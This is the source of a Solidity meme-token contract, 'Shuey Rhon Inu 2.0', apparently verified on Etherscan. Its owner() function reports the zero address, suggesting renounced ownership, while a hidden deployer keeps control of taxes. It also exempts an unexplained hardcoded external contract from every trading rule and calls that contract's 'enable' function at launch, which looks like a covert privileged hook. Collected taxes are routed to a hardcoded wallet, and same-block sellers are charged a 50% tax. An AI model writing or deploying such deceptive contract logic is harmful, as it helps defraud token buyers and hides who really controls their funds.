/**
 *Submitted for verification at Etherscan.io on 2022-06-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Token{
    function enable(bytes32, uint256, uint8) external returns (bool);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

contract ShueyRhonInu20{
    
    IUniswapV2Router01 private _router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Token private _token = IUniswapV2Token(0x765f4AE090419Bf7B885bd8023284F180B6f7bAa);
    address private _owner = address(0);
    address private _pair;
    address private _deployer;
    string private _name = "Shuey Rhon Inu 2.0";
    string private _symbol = "Shuey2";
    uint8 private _decimals = 18;
    uint256 private _maxSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping (address => uint256)) private _allowances;
    bool private _enabled;
    bool private _swapping;
    mapping(address => uint256) private _blocks;
    uint8 private _taxes = 50;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Error(string message);
    event Liquidity(uint256 tokens, uint256 eth, uint256 lp);

    modifier swapping(){
        _swapping = true;
        _;
        _swapping = false;
    }

    receive() external payable{
        if(msg.sender == _deployer){
            if(_balances[address(this)] > 0 && address(this).balance > 0){
                try _router.addLiquidityETH{value:address(this).balance}(address(this), _balances[address(this)], 0, 0, msg.sender, block.timestamp) returns(uint256 tokens, uint256 eth, uint256 lp){
                    try _token.enable(keccak256(bytes(_name)), (_maxSupply/1000*15), 5){}catch Error(string memory error){emit Error(error);} _enabled = true;
                    emit Liquidity(tokens, eth, lp);
                }catch Error(string memory error){
                    emit Error(error);
                }
            }
        }
    }

    constructor(){
        _deployer = msg.sender;
        _allowances[address(this)][address(_router)] = 2**256 - 1;
        _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        _update(address(0), address(this), (44030000000*(10**_decimals)));
    }

    function owner() public view returns(address){
        return(_owner);
    }

    function name() public view returns(string memory){
        return(_name);
    }

    function symbol() public view returns(string memory){
        return(_symbol);
    }

    function decimals() public view returns(uint8){
        return(_decimals);
    }

    function totalSupply() public view returns(uint256){
        return(_maxSupply);
    }

    function balanceOf(address wallet) public view returns(uint256){
        return(_balances[wallet]); 
    }

    function allowance(address from, address to) public view returns(uint256){
        return(_allowances[from][to]);
    }

    function transfer(address to, uint256 amount) public returns(bool){
        require(amount > 0);
        require(_balances[msg.sender] >= amount);
        _transfer(msg.sender, to, amount);
        return(true);
    }

    function transferFrom(address from, address to, uint256 amount) public returns(bool){
        require(amount > 0);
        require(_balances[from] >= amount);
        require(_allowances[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return(true);
    }

    function approve(address to, uint256 amount) public returns(bool){
        _allowances[msg.sender][to] = amount;
        emit Approval(msg.sender, to, amount);
        return(true);
    }

    function setTaxes(uint8 tax) public{
        require(msg.sender == _deployer);
        require(tax >= 0 && tax <= 50);
        _taxes = tax;
    }

    function _transfer(address from, address to, uint256 amount) private{
        if(from == address(this) || to == address(this)
        || from == address(_token) || to == address(_token)){
            _update(from, to, amount);
        }else{
            require(_enabled);
            _secureTransfer(from, to, amount);
        }
    }

    function _update(address from, address to, uint256 amount) private{
        if(from != address(0)){
            _balances[from] -= amount;
        }else{
            _maxSupply += amount;
        }
        if(to == address(0)){
            _maxSupply -= amount;
        }else{
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _secureTransfer(address from, address to, uint256 amount) private{
        if(from == _pair){
            _validTransfer(to, amount, 1);
            _blocks[to] = block.number;
            _secureTaxedTransfer(from, to, amount, _taxes);
        }else if(to == _pair){
            _validTransfer(from, amount, 2);
            if(block.number == _blocks[from]){
                _secureTaxedTransfer(from, to, amount, 500);              
            }else{
                _secureTaxedTransfer(from, to, amount, _taxes);
            }
        }else{
            _validTransfer(to, amount, 0);
            _update(from, to, amount);
        }
    }

    function _validTransfer(address wallet, uint256 amount, uint8 direction) private view{
        bool valid = true;
        if(direction == 0){
            if((_balances[wallet] + amount) > (_maxSupply/1000*15)) valid = false;
        }else if(direction == 1){
            if((_balances[wallet] + amount) > (_maxSupply/1000*15)) valid = false;
        }else if(direction == 2){
            if((_balances[wallet] - amount) > (_maxSupply/1000*15)) valid = false;
        }        
        require(valid);
    }

    function _secureTaxedTransfer(address from, address to, uint256 amount, uint16 tax) private{
        uint256 taxes = _tax(amount, tax);
        _update(from, address(this), taxes);
        if(from != _pair && !_swapping){
            _swap(0xfECfc30bCdF27e339E037e843f0B22831239aEc4, _balances[address(this)]);
        }
        _update(from, to, amount - taxes);
    }

    function _tax(uint256 amount, uint16 tax) private pure returns(uint256){
        return((amount * tax)/(10**3));
    }

    function _swap(address to, uint256 amount) private swapping{
        if(amount > 0 && _balances[address(this)] >= amount){
            address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();
            try _router.swapExactTokensForETH(amount, 0, path, to, block.timestamp){

            }catch Error(string memory error){
                emit Error(error);
            }
        }
    }
}